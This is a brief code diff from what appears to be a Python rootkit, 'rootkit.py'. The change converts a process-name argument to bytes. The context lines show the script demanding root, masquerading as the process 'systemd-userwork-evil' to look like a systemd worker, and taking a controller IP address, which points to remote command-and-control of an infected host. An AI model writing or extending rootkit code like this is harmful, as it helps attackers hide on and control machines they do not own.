@@ -37,7 +37,7 @@ if os.geteuid() != 0:
     print("ERROR: Root privileges are required to run this program!", file=sys.stderr)
     exit(1)
 
-set_proc_name("systemd-userwork-evil")
+set_proc_name(b"systemd-userwork-evil")
 
 PARSER = argparse.ArgumentParser("./rootkit.py")
 PARSER.add_argument("controller_ip", help="The IPv4 address of the controller host.")
